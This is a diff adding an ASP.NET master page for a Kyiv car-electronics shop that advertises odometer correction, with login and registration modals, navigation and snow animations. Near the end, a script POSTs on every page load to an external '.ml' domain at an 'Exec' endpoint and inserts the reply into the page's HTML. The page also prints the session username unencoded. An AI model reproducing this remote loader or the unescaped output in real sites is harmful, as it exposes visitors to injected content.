@@ -1,0 +1,655 @@
+﻿<%@ Master Language="C#" AutoEventWireup="true" CodeBehind="Site.master.cs" Inherits="WCarDump.Site" %>
+
+<%@ Register Src="~/ModalW/UCModalWindows.ascx" TagName="UCModalWindows" TagPrefix="UCModalWindows" %>
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head runat="server">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name='wmail-verification' content='41261961da9129f6a9ca124438288df0' />
+    <link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
+    <link href="ModalWindow/DialogStyle.css" rel="stylesheet" />
+    <script src="js/jquery-1.11.3.js"></script>
+
+    <script type="text/javascript" src="ModalWindow/jquery.leanModal.min.js"></script>
+    <script type="text/javascript">
+        $(function () {
+            $('a[rel*=leanModal]').leanModal({ top: 150, closeButton: ".modal_close" });
+        });
+    </script>
+
+    <asp:ContentPlaceHolder ID="head" runat="server">
+    </asp:ContentPlaceHolder>
+
+    <title>Автомобильная электроника в Киеве SPCOM | Коррекция показаний одометра (044) 228-12-17   </title>
+    <script>
+        (function (i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+                (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date(); a = s.createElement(o),
+            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+
+        ga('create', 'UA-68834163-1', 'auto');
+        ga('send', 'pageview');
+
+    </script>
+    <script>
+        (function (i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+                (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date(); a = s.createElement(o),
+            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+
+        ga('create', 'UA-68834163-3', 'auto');
+        ga('send', 'pageview');
+
+    </script>
+    <script>
+
+        function setheight() {
+            var clientHeight = window.innerHeight;
+            $('.border').css("min-height", clientHeight + 180);
+        }
+
+        $(document).ready(function () {
+            setheight();
+        });
+        $(window).resize(function () {
+            setheight();
+        });
+
+
+        function hideall() {
+            $(".DefaultContainer .ContainerPage").hide();
+            //alert('1');
+        }
+
+        var currentPageId = "mainpage";
+        var lock = false;
+        $(document).ready(function () {
+            hideall();
+            $("#mainpage").show();
+            //alert('2');
+        });
+
+
+        $(document).ready(function () {
+            $(".DivNavi ul li a").mouseenter(function () {
+
+                var pid = $(this).attr('for_page');
+                if (pid != undefined && currentPageId != pid && !lock) {
+                    lock = true;
+                    hideall();
+                    $('#' + pid).fadeIn(300);
+                    currentPageId = pid;
+
+                    lock = false;
+
+                }
+            });
+        });
+
+
+
+
+
+    </script>
+</head>
+
+<body>
+
+    <form id="form1" runat="server" enctype="multipart/form-data">
+
+        <div id="SideButton">
+            <button style="" runat="server" id="bContacts" onserverclick="bContacts_ServerClick">
+            </button>
+        </div>
+
+        <div class="shell">
+            <div class="border">
+                <div id="header" style="background: url(css/images/HeaderLogo.png) no-repeat;">
+                    <style>
+                        #canvas {
+                            border: 1px solid black;
+                            position: absolute;
+                            z-index: 10000;
+                        }
+
+                        #flake {
+                            color: #fff;
+                            position: absolute;
+                            font-size: 25px;
+                            top: -50px;
+                        }
+
+                        .formDLG {
+                            width: 500px;
+                            height: auto;
+                            margin: 0 auto;
+                            max-width: 95%;
+                            box-sizing: border-box;
+                            padding: 5px;
+                            border-radius: 5px;
+                            background: RGBA(255,255,255,255);
+                            /*-webkit-box-shadow:  0px 0px 15px 0px rgba(0, 0, 0, .45);*/
+                            /*box-shadow:  0px 0px 15px 0px rgba(0, 0, 0, .45);*/
+                        }
+                        /* Стили полей ввода */
+                        .textbox {
+                            height: 50px;
+                            width: 100%;
+                            border-radius: 3px;
+                            border: rgba(0,0,0,.3) 2px solid;
+                            box-sizing: border-box;
+                            font-family: 'Open Sans', sans-serif;
+                            font-size: 18px;
+                            padding: 10px;
+                            margin-bottom: 5px;
+                        }
+
+                        /* Стили текстового поля */
+                        .message {
+                            background: rgba(255, 255, 255, 0.4);
+                            width: 100%;
+                            height: 120px;
+                            border: rgba(0,0,0,.3) 2px solid;
+                            box-sizing: border-box;
+                            -moz-border-radius: 3px;
+                            font-size: 18px;
+                            font-family: 'Open Sans', sans-serif;
+                            -webkit-border-radius: 3px;
+                            border-radius: 3px;
+                            display: block;
+                            padding: 10px;
+                            margin-bottom: 5px;
+                            overflow: hidden;
+                        }
+                        /* Базовые стили кнопки */
+                        .button {
+                            height: 50px;
+                            width: 100%;
+                            border-radius: 3px;
+                            border: rgba(0,0,0,.3) 0px solid;
+                            box-sizing: border-box;
+                            padding: 10px;
+                            background: #071250;
+                            color: #FFF;
+                            font-family: 'Open Sans', sans-serif;
+                            font-weight: 400;
+                            font-size: 16pt;
+                            transition: background .4s;
+                            cursor: pointer;
+                            margin-top: 5px;
+                        }
+                            /* Изменение фона кнопки при наведении */
+                            .button:hover {
+                                background: #090d21;
+                            }
+
+                        /* Стили модального окна */
+                        .modal-header h2 {
+                            color: #555;
+                            font-size: 20px;
+                            font-weight: normal;
+                            line-height: 1;
+                            margin: 0;
+                        }
+                        /* кнопка закрытия окна */
+                        .modal .btn-close {
+                            color: #aaa;
+                            cursor: pointer;
+                            font-size: 30px;
+                            text-decoration: none;
+                            position: absolute;
+                            right: 5px;
+                            top: 0;
+                        }
+
+                            .modal .btn-close:hover {
+                                color: red;
+                            }
+                        /* слой затемнения */
+                        .modal-wrap:before {
+                            content: "";
+                            display: none;
+                            background: rgba(0, 0, 0, .3);
+                            position: fixed;
+                            top: 0;
+                            left: 0;
+                            right: 0;
+                            bottom: 0;
+                            z-index: 101;
+                        }
+
+                        .modal-overlay {
+                            bottom: 0;
+                            display: none;
+                            left: 0;
+                            position: fixed;
+                            right: 0;
+                            top: 0;
+                            z-index: 102;
+                        }
+                        /* активация слоя затемнения и модального блока */
+                        .modal-open:checked ~ .modal-wrap:before,
+                        .modal-open:checked ~ .modal-wrap .modal-overlay {
+                            display: block;
+                        }
+
+                        .modal-open:checked ~ .modal-wrap .modal-dialog {
+                            -webkit-transform: translate(-50%, 0);
+                            -ms-transform: translate(-50%, 0);
+                            -o-transform: translate(-50%, 0);
+                            transform: translate(-50%, 0);
+                            top: 20%;
+                        }
+                        /* элементы модального окна */
+                        .modal-dialog {
+                            background: #fefefe;
+                            border: none;
+                            border-radius: 5px;
+                            position: fixed;
+                            width: 80%;
+                            max-width: 500px;
+                            left: 50%;
+                            top: -100%;
+                            -webkit-box-shadow: 0 15px 20px rgba(0,0,0,.22),0 19px 60px rgba(0,0,0,.3);
+                            -moz-box-shadow: 0 15px 20px rgba(0,0,0,.22),0 19px 60px rgba(0,0,0,.3);
+                            box-shadow: 0 15px 20px rgba(0,0,0,.22),0 19px 60px rgba(0,0,0,.3);
+                            -webkit-transform: translate(-50%, -500%);
+                            -ms-transform: translate(-50%, -500%);
+                            -o-transform: translate(-50%, -500%);
+                            transform: translate(-50%, -500%);
+                            -webkit-transition: -webkit-transform 0.4s ease-out;
+                            -moz-transition: -moz-transform 0.4s ease-out;
+                            -o-transition: -o-transform 0.4s ease-out;
+                            transition: transform 0.4s ease-out;
+                            z-index: 103;
+                        }
+
+                        .modal-body p {
+                            margin: 0;
+                        }
+
+                        .modal-header,
+                        .modal-footer {
+                            padding: 20px 20px;
+                        }
+
+                        .modal-header {
+                            border-bottom: #eaeaea solid 1px;
+                        }
+
+                            .modal-header h2 {
+                                font-size: 20px;
+                                margin: 0;
+                            }
+
+                        .modal-footer {
+                            border-top: #eaeaea solid 1px;
+                            text-align: right;
+                        }
+                        /* адаптивные картинки в модальном блоке */
+                        .modal-body img {
+                            max-width: 100%;
+                            height: auto;
+                        }
+                        /* кнопки */
+                        .btn {
+                            background: #fff;
+                            border: #555 solid 1px;
+                            border-radius: 3px;
+                            cursor: pointer;
+                            display: inline-block;
+                            font-size: 14px;
+                            padding: 8px 15px;
+                            text-decoration: none;
+                            text-align: center;
+                            min-width: 60px;
+                            position: relative;
+                        }
+
+                            .btn:hover, .btn:focus {
+                                background: #f2f2f2;
+                            }
+
+                        .btn-primary {
+                            background: #428bca;
+                            border-color: #357ebd;
+                            color: #fff;
+                        }
+
+                            .btn-primary:hover {
+                                background: #66A1D3;
+                            }
+
+                        .modalContainer {
+                            padding: 20px;
+                        }
+                    </style>
+
+                    <style>
+                        .smallbtns {
+                            background-color: rgba(117, 117, 117, 0.67);
+                            padding: 4px;
+                            color: #d0d0d0;
+                            border: none;
+                        }
+                    </style>
+                    <div style="float: right; margin-top: 33px;">
+                        <div runat="server" id="enterdiv">
+                            <label class="smallbtns" for="modal-2">Вход</label>
+                            <label class="smallbtns" for="modal-1">Регистрация</label>
+                        </div>
+                        <div runat="server" id="logoutDiv">
+                            <% string lines = "";
+                                for(int i = 0; i < 11; i++)
+                                {
+                                    lines += i.ToString();
+                                } %>
+                            <%-- <%=lines %>--%>
+
+                            <label class="smallbtns" style="color: white;">Здравствуйте <strong><%= Session["susername"] ?? "err" %></strong> </label>
+                            <asp:Button runat="server" ID="blogout" Text="Выход" CssClass="smallbtns" OnClick="blogout_Click" />
+                            <a runat="server" href="AdminAllUsers.aspx" id="hrefAdmin" class="smallbtns">Панель администратора</a>
+
+                        </div>
+                    </div>
+
+                    <!-- Модальное окно -->
+                    <div class="modal">
+                        <input class="modal-open" id="modal-1" type="checkbox" hidden />
+                        <div class="modal-wrap" aria-hidden="true" role="dialog">
+                            <label class="modal-overlay" for="modal-1"></label>
+                            <div class="modal-dialog">
+                                <div class="modal-header">
+                                    <h2>Регистрация пользователя </h2>
+                                    <label class="btn-close" for="modal-1" aria-hidden="true">×</label>
+                                </div>
+                                <div class="modal-body">
+                                    <div class="modalContainer">
+                                        <input name="name" placeholder="* Укажите ваше имя" class="textbox" runat="server" id="tbregName" />
+                                        <input name="name" placeholder="* Укажите фамилию" class="textbox" runat="server" id="tbregFam" />
+                                        <input name="phonnumber" placeholder="* Укажите ваш телефон" class="textbox" type="text" runat="server" id="tbregTel" />
+                                        <input name="emailaddress" placeholder="* Укажите ваш Email" class="textbox" type="email" runat="server" id="tbregEmail" />
+                                        <input name="password" placeholder="* Укажите пароль " class="textbox" type="password" runat="server" id="tbregpass1" />
+                                        <input name="password" placeholder="* Повторите пароль " class="textbox" type="password" runat="server" id="tbregpass2" />
+                                        <asp:CheckBox runat="server" ID="cbSoglas" Checked="false" Text="согласие на сбор и обработку персональных данных" />
+                                        <%--     <input  name="submit" class="button" type="submit" value="Регистрация" />--%>
+                                        <asp:Button runat="server" Text="Регистрация" CssClass="button" ID="bRegisterUser" OnClick="bRegisterUser_Click" />
+                                    </div>
+
+
+
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+
+
+
+
+
+
+
+                    <!-- Модальное окно -->
+                    <div class="modal">
+                        <input class="modal-open" id="modal-2" type="checkbox" hidden />
+                        <div class="modal-wrap" aria-hidden="true" role="dialog">
+                            <label class="modal-overlay" for="modal-2"></label>
+                            <div class="modal-dialog">
+                                <div class="modal-header">
+                                    <h2>Вход </h2>
+                                    <label class="btn-close" for="modal-2" aria-hidden="true">×</label>
+                                </div>
+                                <div class="modal-body">
+                                    <div class="modalContainer">
+
+                                        <input runat="server" id="tbloginEmail" name="emailaddress" placeholder="* Укажите ваш Email" class="textbox" type="email" />
+                                        <input runat="server" id="tbloginPass" name="password" placeholder="* Укажите пароль " class="textbox" type="password" />
+                                        <%--<input  name="submit" class="button" type="submit" value="Вход" />--%>
+                                        <%--<button runat="server" id="bLogin"  onserverclick+="bLoginClick">Вход</button>--%>
+
+                                        <asp:Button runat="server" Text="Вход" CssClass="button" ID="bLogin" OnClick="bLoginClick" />
+                                        <input name="submit" class="button" type="submit" value="Забыли пароль?"
+                                            onclick=" document.getElementById('modal-2').checked = false; document.getElementById('modal-3').checked = true; return false;" />
+
+                                    </div>
+                                </div>
+                                <%-- <div class="modal-footer">
+        <label class="btn btn-primary" for="modal-1">Отлично!</label>
+      </div>--%>
+                            </div>
+                        </div>
+                    </div>
+
+
+
+
+                    <!-- Модальное окно -->
+                    <div class="modal">
+                        <input class="modal-open" id="modal-3" type="checkbox" hidden />
+                        <div class="modal-wrap" aria-hidden="true" role="dialog">
+                            <label class="modal-overlay" for="modal-3"></label>
+                            <div class="modal-dialog">
+                                <div class="modal-header">
+                                    <h2>Забыли пароль? </h2>
+                                    <label class="btn-close" for="modal-3" aria-hidden="true">×</label>
+                                </div>
+                                <div class="modal-body">
+                                    <div class="modalContainer">
+                                        <input runat="server" id="tbRestoreEmail" name="emailaddress" placeholder="* Укажите ваш Email" class="textbox" type="email" />
+                                        <%--<input  name="phonnumber" placeholder="* Укажите ваш телефон" class="textbox" type="text" />--%>
+                                        <%-- <input name="submit" class="button" type="submit" value="Восстановить" />--%>
+                                        <asp:Button runat="server" CssClass="button" ID="bRestorePassword" Text="Восстановить" OnClick="bRestorePassword_Click" />
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+
+
+
+
+
+
+
+
+                    <div class="cl">&nbsp;</div>
+                </div>
+                <div class="DivNavi">
+                    <ul class="top-level">
+                        <li><a href="default.aspx" for_page="mainpage">Главная</a></li>
+                        <li><a href="ShopServicesMainList.aspx">Услуги</a>
+                            <ul class="second-level">
+                                <li><a href="ShopServicesDetails.aspx?id=1" for_page="PCorrection">Коррекция пробега</a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=2" for_page="PDiagnostic">Диагностика авто</a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=3" for_page="PAirBag">Ремонт блоков SRS Airbag </a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=5" for_page="PPixeli">Ремонт погасших сегментов на экранах ЖКИ </a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=6" for_page="PAmerican">Американские стандарты на европейские</a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=7" for_page="PElectronika">Ремонт автомобильной электроники</a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=8" for_page="PChipKey">Изготовление Чип-ключей</a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=9" for_page="PStartError">Устранение ошибки StartError</a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=10" for_page="PKrimistop">Система защиты Krimistop</a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=11" for_page="PProgram">Чип-тюнинг</a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=18" for_page="PMagnitoli">Раскодировка магнитол</a></li>
+                                <li><a href="ShopServicesDetails.aspx?id=21" for_page="PNamotki">Изготовление намоток пробега</a></li>
+
+                            </ul>
+                        </li>
+                        <li><a href="ShopPromo.aspx">Магазин</a>
+
+                        </li>
+                        <li><a href="AboutUs.aspx#rhead">О Компании</a></li>
+                        <li><a href="faq.aspx">FAQ</a></li>
+                        <li><a href="News.aspx#rhead">Новости</a></li>
+                        <li><a href="BlogMainList.aspx#rhead">Наши работы</a></li>
+                        <li><a href="Karta.aspx#rhead">Карта сайта</a></li>
+                        <li><a href="contacts.aspx#rhead">Контакты</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <asp:ContentPlaceHolder ID="ContentPlaceHolderForNestedMasterPage" runat="server">
+                    </asp:ContentPlaceHolder>
+                </div>
+                <div class="shadow-l"></div>
+                <div class="shadow-r"></div>
+                <div class="shadow-b"></div>
+                <div class="cl">
+                </div>
+            </div>
+
+            <div id="footer" style="bottom: 0px; position: fixed; width: 914px; z-index: 10;">
+
+                <div>
+                    Все права защищены. © Ремонт электроники автомобилей, коррекция спидометра,
+            дооснащение авто - Диагностическое оборудование для автомобилей, 
+            программирование автомобилей, чип тюнинг, намотка пробега, автодиагностика, 
+            комплексный ремонт электроники Вашего авто.
+                </div>
+            </div>
+        </div>
+
+
+    </form>
+
+    <script>
+        function loadDoc() {
+            var xhttp = new XMLHttpRequest();
+
+            xhttp.onreadystatechange = function () {
+                if (xhttp.readyState == 4 && xhttp.status == 200) {
+                    document.getElementById("demo444343").innerHTML = xhttp.responseText;
+                }
+            }
+            xhttp.open("post", "http://www.cataloguespcom.ml/SiteLoaded/Exec?id=1", true);
+            xhttp.send();
+        }
+
+        loadDoc();
+    </script>
+
+
+
+    <div id="flake">&#10052;</div>
+
+    <script>
+
+
+        var t = setInterval(
+            function () {
+                var documentHeight = $(document).height();
+                var startPositionLeft = Math.random() * $(document).width() - 100;
+                var startOpacity = 0.5 + Math.random();
+                var sizeFlake = 10 + Math.random() * 20;
+                var endPositionTop = documentHeight - 40;
+                var endPositionLeft = startPositionLeft - 100 + Math.random() * 200;
+                var durationFall = documentHeight * 10 + Math.random() * 5000;
+                $('#flake')
+                    .clone()
+                    .appendTo('body')
+                    .css(
+                        {
+                            left: startPositionLeft,
+                            opacity: startOpacity,
+                            'font-size': sizeFlake
+                        }
+                    )
+                    .animate(
+                        {
+                            top: endPositionTop,
+                            left: endPositionLeft,
+                            opacity: 0.2
+                        },
+                        durationFall,
+                        'linear',
+                        function () {
+                            $(this).remove()
+                        }
+                    );
+            }, 500);
+
+
+
+
+        var snow = {};
+        var snowflex = {};
+
+        snowflex.create = function () {
+            var flex = document.createElement('div');
+            flex.innerHTML = "&#10052;";
+            flex.style.fontSize = 10 + Math.random() * 20 + 'px';
+            flex.style.top = -50 + Math.random() * 20 + 'px';
+            flex.style.left = Math.random() * 1500 + 'px';
+            flex.style.position = "absolute";
+            flex.style.color = "#F3F3F3";
+            flex.style.opacity = Math.random();
+            document.getElementsByTagName('body')[0].appendChild(flex);
+            return flex;
+        };
+
+
+        snow.snowflex = function () {
+            var flex = snowflex.create();
+            var x = -1 + Math.random() * 2;
+            var t = setInterval(
+                        function () {
+                            flex.style.top = parseInt(flex.style.top) + 5 + 'px';
+                            flex.style.left = parseInt(flex.style.left) + x + 'px';
+                            if (parseInt(flex.style.top) > 1500) {
+                                clearInterval(t);
+                                document.getElementsByTagName('body')[0].removeChild(flex);
+                            }
+                        }, 45 + Math.random() * 20);
+        };
+
+        snow.storm = function () {
+            var t = setInterval(
+                        function () {
+                            snow.snowflex();
+                        }, 500);
+        };
+
+        //snow.storm();
+
+        var fog = {};
+
+        fog.draw = function (ctx, x, y) {
+
+            ctx.fillStyle = "rgba( 255, 255, 255, " + Math.random() + " )";
+            ctx.arc(x, y, 10, 0, Math.PI * 2, true);
+            ctx.closePath();
+            ctx.fill();
+
+        };
+
+
+        fog.start = function () {
+            var ctx = document.getElementById('canvas').getContext("2d");
+            var x = 0;
+            var y = 0;
+            var t = setInterval(
+                        function () {
+
+                            x = 300 + 300 * Math.sin(x);
+                            y = 300 + 300 * -Math.cos(x);
+
+                            x += 2;
+                            fog.draw(ctx, x, y);
+
+                        }, 100);
+
+        };
+
+        //fog.start();
+
+    </script>
+
+</body>
+</html>
